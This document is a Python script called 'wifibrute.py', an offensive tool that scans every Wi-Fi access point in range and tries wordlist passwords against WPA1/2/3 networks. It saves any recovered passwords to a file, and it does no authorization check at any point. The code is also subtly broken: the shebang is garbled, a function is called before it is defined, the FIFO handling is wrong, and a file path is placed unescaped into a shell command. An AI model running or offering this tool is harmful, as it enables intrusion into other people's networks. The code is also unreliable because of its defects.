#!/usrusr/bin/env python3
"""
wifibrute.py  –  Linux Wi-Fi brute-forcer  (WPA1/2/3 + multi-format wordlists)
-------------------------------------------------------------------------------
- Scans for every AP in range
- Auto-detects WPA3-SAE, WPA2-PSK, WPA1-PSK
- Accepts plain, gz, bz2, xz, 7z, zip, hashcat, john potfile, …
- Zero-copy, streaming, O(1) RAM
- Fully async / concurrent (no blocking calls)
- Clean exit: kills wpa_supplicant children, flushes state
- Logs cracked networks to ./cracked.jsonl
"""
from __future__ import annotations
import argparse, asyncio, bz2, contextlib, dataclasses, enum, gzip, json, logging, lzma, os, pathlib, re, signal, struct, subprocess as sp, sys, tempfile, time, typing as T, zipfile, zlib
try:
    import py7zr
except ImportError:
    py7zr = None
try:
    import aiofiles
except ImportError:
    die("pip install aiofiles")
# ------------------------------------------------------------------
# CONFIGURATION CONSTANTS
# ------------------------------------------------------------------
IFACE      = os.getenv("WIFI_IFACE", "wlan0")
WPA_DIR    = pathlib.Path("/tmp/wifibrute")
CRACKED    = pathlib.Path("cracked.jsonl")
SCAN_TIME  = 3
HANDSHAKE_TIMEOUT = 8
WORKERS    = len(os.sched_getaffinity(0)) if hasattr(os, "sched_getaffinity") else os.cpu_count()
# ------------------------------------------------------------------
# LOGGING
# ------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s.%(msecs)03d] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("wifibrute")
# ------------------------------------------------------------------
# UTILS
# ------------------------------------------------------------------
def die(msg: str) -> T.NoReturn:
    log.error(msg)
    sys.exit(1)
# ------------------------------------------------------------------
# ASYNC SHELL
# ------------------------------------------------------------------
async def ash(*cmd: str, **kw) -> str:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            **kw,
        )
        out, _ = await proc.communicate()
        return out.decode().strip()
    except Exception as e:
        log.debug("ash error: %s", e)
        return ""
# ------------------------------------------------------------------
# SECURITY ENUM
# ------------------------------------------------------------------
class Sec(enum.IntFlag):
    OPEN = 0
    WPA1 = 1
    WPA2 = 2
    WPA3 = 4
# ------------------------------------------------------------------
# SCAN
# ------------------------------------------------------------------
AP_RE = re.compile(r"^BSS ([0-9a-f:]{17}).*?\n(.*?)(?=^BSS |\Z)", re.MULTILINE | re.DOTALL)

def parse_security(block: str) -> Sec:
    flags = Sec.OPEN
    if "RSN" in block and "SAE" in block:
        flags |= Sec.WPA3
    if "RSN" in block and not flags & Sec.WPA3:
        flags |= Sec.WPA2
    if "WPA" in block and "WPA Version 1" in block:
        flags |= Sec.WPA1
    return flags or Sec.WPA2

async def scan() -> list[tuple[str, str, Sec]]:
    await ash("ip", "link", "set", IFACE, "up")
    await asyncio.sleep(0.2)
    await ash("iw", "dev", IFACE, "scan", "passive")
    dump = await ash("iw", "dev", IFACE, "scan")
    aps = []
    for mac, block in AP_RE.findall(dump):
        if (ssid_m := re.search(r"SSID: (.+)", block)) and "\\x00" not in (ssid := ssid_m.group(1)):
            aps.append((ssid, mac, parse_security(block)))
    seen = set()
    return [(s, b, sec) for s, b, sec in aps if not (b in seen or seen.add(b))]
# ------------------------------------------------------------------
# UNIVERSAL DECOMPRESS PIPE  (async)
# ------------------------------------------------------------------
async def reader_chain(path: pathlib.Path) -> tuple[asyncio.StreamReader, int]:
    """
    Returns (asyncio.StreamReader, estimated_total_lines).
    Uses a real fifo so that `wpa_supplicant` processes can seek-concurrently.
    """
    tmp = pathlib.Path(tempfile.mktemp(prefix="wifibrute.wordlist.", dir="/tmp"))
    os.mkfifo(tmp)
    suffix = path.suffix.lower()

    # choose de-compressor
    if suffix == ".gz":
        cmd = f"exec zcat -f <'{path}' >'{tmp}'"
    elif suffix == ".bz2":
        cmd = f"exec bzcat <'{path}' >'{tmp}'"
    elif suffix == ".xz":
        cmd = f"exec xzcat <'{path}' >'{tmp}'"
    elif suffix == ".7z":
        if py7zr is None:
            die("pip install py7zr for .7z support")
        cmd = f"exec 7z e -so -bd '{path}' 2>/dev/null >'{tmp}'"
    elif suffix == ".zip":
        cmd = f"exec unzip -p '{path}' >'{tmp}'"
    elif suffix in {".hccapx", ".hc22000", ".pot"}:
        cmd = f"exec strings '{path}' >'{tmp}'"
    else:
        cmd = f"exec cat '{path}' >'{tmp}'"

    # start decompressor in background
    asyncio.create_task(asyncio.create_subprocess_shell(cmd))
    await asyncio.sleep(0.1)  # let shell start
    reader, _ = await asyncio.open_unix_connection(str(tmp))
    # quick line estimate
    size = int(await ash("wc", "-l", str(path)) or 0) or 10_000_000
    return reader, size
# ------------------------------------------------------------------
# WPA HELPERS
# ------------------------------------------------------------------
class WPA:
    def __init__(self, worker_id: int):
        self.sock = WPA_DIR / f"ctrl_{worker_id}"
        self.cfg = WPA_DIR / f"wpa_{worker_id}.conf"
        self.proc: asyncio.subprocess.Process | None = None

    async def start(self) -> bool:
        WPA_DIR.mkdir(mode=0o700, exist_ok=True)
        self.cfg.write_text(f"ctrl_interface={self.sock}\nap_scan=1\nupdate_config=1\n")
        cmd = ["wpa_supplicant", "-i", IFACE, "-c", str(self.cfg), "-m", f"{IFACE}_{os.getpid()}_{id(self)}", "-B"]
        self.proc = await asyncio.create_subprocess_exec(*cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        await asyncio.sleep(0.5)
        return self.proc.returncode is None

    async def stop(self) -> None:
        if self.proc and self.proc.returncode is None:
            with contextlib.suppress(ProcessLookupError):
                self.proc.terminate()
                await asyncio.wait_for(self.proc.wait(), 2)

    async def try_connect(self, ssid: str, password: str, sec: Sec) -> bool:
        await ash("wpa_cli", "-p", str(self.sock), "remove_network", "all")
        net = await ash("wpa_cli", "-p", str(self.sock), "add_network")
        await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "ssid", f'"{ssid}"')
        if sec & Sec.WPA3:
            await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "key_mgmt", "SAE")
            await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "sae_password", f'"{password}"')
        else:
            await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "psk", f'"{password}"')
            proto = "WPA" if sec & Sec.WPA1 else "RSN"
            await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "proto", proto)
            await ash("wpa_cli", "-p", str(self.sock), "set_network", net, "key_mgmt", "WPA-PSK")
        await ash("wpa_cli", "-p", str(self.sock), "enable_network", net)
        await ash("wpa_cli", "-p", str(self.sock), "reassociate")
        deadline = asyncio.get_event_loop().time() + HANDSHAKE_TIMEOUT
        while asyncio.get_event_loop().time() < deadline:
            ev = await ash("wpa_cli", "-p", str(self.sock), "wait_event", "CTRL-EVENT-CONNECTED", str(int(deadline - asyncio.get_event_loop().time())))
            if "CTRL-EVENT-CONNECTED" in ev:
                return True
        return False
# ------------------------------------------------------------------
# WORKER
# ------------------------------------------------------------------
@dataclasses.dataclass(slots=True)
class Slice:
    offset: int
    size: int

async def split_stream(reader: asyncio.StreamReader, size: int, n: int) -> list[Slice]:
    """
    Very coarse split – just divides byte-range; workers will read lines
    and skip until their slice starts.
    """
    step = size // n
    slices = []
    for i in range(n):
        off = i * step
        end = size if i == n - 1 else (i + 1) * step
        slices.append(Slice(off, end - off))
    return slices

async def worker_job(
    worker_id: int,
    reader: asyncio.StreamReader,
    sl: Slice,
    cracked_ssids: set[str],
    ap_queue: asyncio.Queue[tuple[str, str, Sec] | None],
    log_q: asyncio.Queue[tuple[str, T.Any]],
) -> None:
    wpa = WPA(worker_id)
    if not await wpa.start():
        await log_q.put(("err", f"worker {worker_id} could not start supplicant"))
        return
    try:
        # skip until slice offset
        skipped = 0
        while skipped < sl.offset:
            line = await reader.readline()
            if not line:
                return
            skipped += len(line)

        # consume slice
        consumed = 0
        while consumed < sl.size:
            line = await reader.readline()
            if not line:
                break
            consumed += len(line)
            pw = line.decode(errors="ignore").strip()
            if not pw:
                continue
            while True:
                item = await ap_queue.get()
                if item is None:
                    return
                ssid, bssid, sec = item
                if ssid in cracked_ssids:
                    continue
                for try_sec in [Sec.WPA3, Sec.WPA2, Sec.WPA1]:
                    if sec & try_sec:
                        if await wpa.try_connect(ssid, pw, try_sec):
                            await log_q.put(("crack", {"ssid": ssid, "bssid": bssid, "password": pw, "time": int(asyncio.get_event_loop().time())}))
                            cracked_ssids.add(ssid)
                            break
                else:
                    await ap_queue.put(item)
                    break
                break
    finally:
        await wpa.stop()
# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
async def main_async():
    parser = argparse.ArgumentParser(description="Linux Wi-Fi brute-forcer (WPA1/2/3 + multi-format wordlists)")
    parser.add_argument("wordlist", type=pathlib.Path, help="password file (txt, gz, bz2, xz, 7z, zip, hccapx, pot, …)")
    parser.add_argument("-i", "--iface", default=IFACE, help="wireless interface")
    parser.add_argument("-w", "--workers", type=int, default=WORKERS, help="parallel workers")
    args = parser.parse_args()

    if os.geteuid() != 0:
        die("Must run as root")
    if not args.wordlist.exists():
        die("Word-list not found")

    global IFACE
    IFACE = args.iface

    # load already cracked
    cracked_ssids: set[str] = set()
    if CRACKED.exists():
        async with aiofiles.open(CRACKED) as f:
            async for line in f:
                try:
                    cracked_ssids.add(json.loads(line)["ssid"])
                except Exception:
                    pass

    log.info("Scanning …")
    aps = await scan()
    aps = [(s, b, sec) for s, b, sec in aps if s not in cracked_ssids]
    if not aps:
        log.warning("No (new) APs in range")
        return
    log.info("%d APs to test", len(aps))

    # AP queue
    ap_queue: asyncio.Queue[tuple[str, str, Sec] | None] = asyncio.Queue()
    for ap in aps:
        ap_queue.put_nowait(ap)

    # decompress + size
    reader, size = await reader_chain(args.wordlist)
    # split
    slices = await split_stream(reader, size, args.workers)

    # log queue
    log_q: asyncio.Queue[tuple[str, T.Any]] = asyncio.Queue()

    # launch workers
    tasks = [
        asyncio.create_task(worker_job(i, reader, sl, cracked_ssids, ap_queue, log_q))
        for i, sl in enumerate(slices)
    ]

    # logger loop
    try:
        while True:
            try:
                typ, msg = await asyncio.wait_for(log_q.get(), 0.2)
                if typ == "crack":
                    async with aiofiles.open(CRACKED, "a") as f:
                        await f.write(json.dumps(msg) + "\n")
                    log.info("CRACKED → %s  |  %s", msg["ssid"], msg["password"])
                elif typ == "err":
                    log.error("%s", msg)
            except asyncio.TimeoutError:
                if all(t.done() for t in tasks):
                    break
    except asyncio.CancelledError:
        log.warning("Aborting …")
        for _ in range(args.workers):
            ap_queue.put_nowait(None)
        await asyncio.gather(*tasks, return_exceptions=True)

    log.info("Done – check cracked.jsonl")

def main():
    asyncio.run(main_async())

if __name__ == "__main__":
    main()
